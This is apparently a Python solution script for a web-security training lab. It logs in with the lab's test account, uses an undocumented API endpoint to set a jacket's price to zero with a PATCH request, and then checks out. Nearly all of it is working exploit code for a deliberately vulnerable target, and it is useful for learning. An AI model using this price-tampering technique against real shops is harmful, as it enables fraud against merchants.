'''
To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.
'''

import requests
from bs4 import BeautifulSoup

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a5000be04c91fa5840a7e220089006e.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login with wiener:peter
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# Update product price
headers = {
    'Content-Type':'application/json'
}

payload = {'price':0}
r = s.patch(f"{url}/api/products/1/price", headers=headers, json=payload)
print(r.json())

# Add product to cart
payload = {
    'productId':1,
    'redir':'CART',
    'quantity':1
}
r = s.post(f"{url}/cart", data=payload)

soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

# Place order
r = s.post(f"{url}/cart/checkout", data={'csrf':csrf})
